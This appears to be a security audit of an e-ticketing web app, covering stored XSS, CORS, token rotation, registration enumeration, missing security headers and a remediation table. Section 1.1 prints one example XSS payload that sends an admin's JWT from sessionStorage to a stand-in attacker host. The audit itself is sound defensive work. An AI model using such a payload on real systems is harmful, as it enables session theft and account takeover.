# Security Audit — E-Ticketing System

**Date:** 2026-09-18  
**Method:** code-grounded inspection (grep + source read), live-dialect checks against MariaDB 10.4.32 (XAMPP). No automated scanner run.
**Scope:** `backend/app.py`, `backend/helpers.py`, `backend/routes/*`, `backend/totp.py`, frontend portals (`frontend/{user,admin}/js/app.js`, shared JS), frontend auth surfaces out of scope per AGENTS.md.

Severity scale: **CRIT** (remote compromise without auth) / **HIGH** (privilege escalation or token theft with realistic effort) / **MED** (defense-in-depth gap) / **LOW** / **INFO**.

---

## 1. Findings

### 1.1 HIGH — Stored XSS via ticket title (and usernames) in admin portal

Titles, descriptions, and comment messages are stored **verbatim** (no server-side sanitization; `routes/tickets.py` `create_ticket` stores `data['title']`/`data['description']` as-is; comments likewise). The admin portal's **ticket list table** injects these into `innerHTML` **unescaped**:

```js
// frontend/admin/js/app.js:1461
<td>${ticket.title}</td>
// ...:1467
<td>${ticket.assigned_to || 'Unassigned'}</td>
```

The same escape helper that exists for the detail/comment views (`this._esc`, admin app.js:716, used at :1612-1694 and :2055-2066) is **not applied** to the list table or the identity-menu dropdown (`mu-name ${u.username}` at :882).

Exploit chain: any authenticated staff member creates a ticket with a title like `<img src=x onerror="fetch('//attacker/',{method:'POST',body:sessionStorage.getItem('ict_access')})">`. When an admin opens the ticket list, the payload executes in the admin's session and exfiltrates the admin access + refresh JWT (sessionStorage). Full account takeover of an admin.

User portal has the identical pattern: `frontend/user/js/app.js:562` (`<td>${ticket.title}</td>`) and `:587` (`<h2>${ticket.title}</h2>`) — `escapeHtml` exists (:16) but is not applied. This allows staff-to-staff XSS and (via ticket the admin views) admin context if an admin previews through user-surface assets.

Contributing root cause: **username has no charset restriction** (`_validate_new_username`, `routes/users.py:42-50`, only enforces length ≥ 2), so usernames themselves can carry markup and are rendered raw in `:882` and in `<option value="${u.username}">` contexts (`:1566, :1745, :1967` — attribute-context injection).

**Recommendation (blocking):** apply `_esc`/`escapeHtml` consistently to every user-controlled field rendered via `innerHTML` in both portals; add a server-side `pattern`/whitelist on username (letters, digits, `._-`, ≤ 50); add a Content-Security-Policy (see 1.6). This is a dedicated task — not implemented in this audit.

### 1.2 MED — Unrestricted CORS

`CORS(app)` at `backend/app.py:77` allows any origin, and the `ALLOWED_ORIGINS` config is defined but unused (also found in Phase E). Mitigating: tokens travel in the `Authorization` header, not cookies, and no `Access-Control-Allow-Credentials` is set, so this is NOT an account-takeover primitive by itself. It does expose the JSON API to any rogue web page for read abuse.

**Recommendation:** `CORS(app, resources=..., origins=ALLOWED_ORIGINS)` once origins are defined; until then keep `supports_credentials=False` (current, correct).

### 1.3 MED — No refresh-token rotation or revocation

`routes/auth.py` `refresh()` issues a new access token but never issues a new refresh token and does not implement `token_version`/revocation. Consequences: a stolen refresh token is usable for up to 30 days (`JWT_REFRESH_TOKEN_EXPIRES`), and deactivating a user does not invalidate an already-issued access token until its 15-minute expiry (`refresh()` re-reads the user and refuses deactivated accounts, and each login carries the *current* username/role — good — but the access token is otherwise unrevocable). Token revocation is an explicitly deferred item (AGENTS.md §5).

**Recommendation (deferred feature):** rotate refresh tokens on use; add `token_version` claim and check it on every `jwt_required` (server-side).

### 1.4 MED — SSE access token in query string

`routes/main.py:317` `event_stream()` accepts the JWT in `?token=` so `EventSource` can use it. Query strings are logged by proxies/servers and can appear in history/referrers.

**Recommendation (when TLS/proxy is deployed):** short-lived subscription token, or a dedicated SSE cookie with `<SameSite>` + `Secure`; confirm nginx access log does not log `$request_uri` unchanged (Phase E nginx config currently logs `$request` — verify).

### 1.5 MED — Open self-service registration and username/account enumeration

`routes/auth.py:139` `register()` is public (rate-limited 3/min) with no admin approval, invite code, or capability gate; it returns role `staff` by default. Anyone who can reach the app can create an account. Also:
- `register` server responses "Username already exists" / "Email already exists" → username/email enumeration.
- `login`: unknown-user and wrong-password return the same message (good), but the **account-locked** response (:60) discloses that an account exists.

**Recommendation:** add a `REGISTRATION_ENABLED` env default off for LAN deployments, or gate on an invite; keep the UUID-style audit on registration writes (already present via `log_audit`).

### 1.6 MED — No security headers / CSP

There is no CSP, `X-Frame-Options`, `X-Content-Type-Options`, or `Referrer-Policy` (HSTS intentionally commented — no TLS deployed). Adding a CSP is the strongest structural defense for 1.1 (blocks inline `onerror` execution). This is a Phase E Level-2 item (proxy layer).

**Recommendation (proxy layer, not yet deployed):** set CSP `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' ws: wss:` — verify against offline-first O1 (system fonts only, inline SVG) after the proxy is live.

### 1.7 LOW — USSD endpoint is fail-open

`ussd.py` entry does not require an IP whitelist or token; protections depend on environment CIDR ACL (documented in Phase E). Exposed to the internet without the Africa's Talking CIDR allow-list, it allows unauthenticated submissions.

**Recommendation:** enforce the AT CIDR allow-list application-side before exposing to WAN; keep log lines at WARN, not INFO, for USSD writes.

### 1.8 LOW — TOTP secret returned in plaintext to browser

`/api/auth/2fa/setup` returns `secret` + `otpauth_uri` in the response body. Standard for enrollment (browser must capture the secret for QR), but it means the provisioning secret exists in a server response and could be cached by intermediaries; and `totp_secret` is stored unencrypted in the DB.

**Recommendation (INFO/low):** rotate the JWT session immediately after 2FA enrollment; consider encrypting `totp_secret` at rest.

### 1.9 INFO — Health/metrics endpoints are public by design

`/api/health` runs `SELECT 1` and returns 200/503 only; `/api/metrics` returns counter names/values only. Verified: no config, credentials, route map, or stack traces; no PII. Acceptable per design; keep them unauthenticated but non-sensitive.

---

## 2. Verified positive controls

| Control | Evidence | Status |
|---|---|---|
| Server-side scoping (S7) | list filtered by `created_by` unless admin (`routes/tickets.py:51-52`); single-ticket 403 (`:196`); update/delete `@role_required('admin')` (`:202, :284`); comments & internal notes scoped (`:305, :327, :334`); attachments access-checked | PASS |
| Password hashing + policy | `generate_password_hash` (werkzeug default, scrypt-class), min 8 chars (`auth.py:155`) | PASS |
| Account lockout | 5 failed logins → 15-min lock (`auth.py:64-66`) | PASS |
| Rate limiting | login 5/min, register 3/min, 2FA verify 10/min (`@limiter.limit(...)`) | PASS |
| 2FA (TOTP) | `totp.py` verify + enrollment requires session; verify endpoint rate-limited | PASS |
| API tokens | hashed at rest (SHA-256 of salted prefix, `helpers.py:_hash_token`), expiry + `is_active` enforced | PASS |
| Webhook signing | HMAC-SHA256 per-hook secret, `X-Ict-Signature` header (`helpers.py:1024-1030`) | PASS |
| Uploads | extension whitelist (`helpers.py:1311`), UUID-stored name, `secure_filename` original, `send_from_directory` (no traversal), 25 MB cap (`app.py:89`) | PASS |
| SQL injection | ORM/parameterized only; the sole `db.text(...)` is `SELECT 1` (`routes/main.py:32`) | PASS |
| Secrets in logs | request logging logs method/path/status/ms only — no bodies, headers, or tokens (C1) | PASS |
| Secrets at rest (env) | `backend/.env` mode 0600, generated keys | PASS |
| Error leakage | JSON errors, no stack traces to clients | PASS |
| CSRF | JWT via Authorization header (no cookies) ⇒ N/A | PASS |

---

## 3. Remediation priority

| # | Severity | Task | Files (est.) | Status |
|---|---|---|---|---|
| P1 | HIGH | Escape all user-controlled fields in both portals' `innerHTML`; add username charset whitelist server-side | `frontend/admin/js/app.js`, `frontend/user/js/app.js`, `routes/users.py`, `routes/auth.py` | **DONE 2026-09-18** |
| P2 | MED | Apply `ALLOWED_ORIGINS` to `CORS(app)` | `app.py` | Open |
| P3 | MED | Refresh-token rotation + `token_version` revocation (deferred feature §5) | auth routes + helpers + JWT claim checks | Open |
| P4 | MED | SSE short-lived token / cookie (when proxy deployed) + nginx `$request_uri` log audit | `routes/main.py`, nginx config | Open |
| P5 | MED | Gate `register` behind env flag + non-revealing existence messages | `routes/auth.py` | Open |
| P6 | MED | CSP + security headers at proxy layer (tied to Phase E Level 2) | nginx config | Open |
| P7 | LOW | USSD app-side CIDR allow-list | `ussd.py` | Open |
| P8 | LOW | Encrypt TOTP secret at rest; rotate JWT after enrollment | `routes/auth.py`, `models.py`, helpers | Open |

**P1 (implemented 2026-09-18):** in `frontend/user/js/app.js` — ticket title, description, resolution, assigned_to, comment author/message, KB title/content/author, attachment filenames, category select options now pass through the existing `escapeHtml`. In `frontend/admin/js/app.js` — ticket list title/assigned_to, mu-name dropdown username/email/department, all `<option value=...>` builders (users, departments, roles, categories), KB table title/author/category, dashboard workload usernames, attachment filenames, API-token/webhook/department names all pass through the existing `_esc`. Server-side in `routes/users.py` and `routes/auth.py` — username charset whitelist `^[A-Za-z0-9_.][A-Za-z0-9_.-]*$` enforced on `register`, admin `create_user`, the admin username-edit path, and social-login-derived usernames (normalized). Verified: 0 violators against the 3 existing DB accounts; 169-test suite green; `validate-frontend.js` clean; `node --check` clean.

P1 was the only blocking finding and is now closed. The rest are defense-in-depth; each is a scoped task under S4 (≤2 files per pass where possible).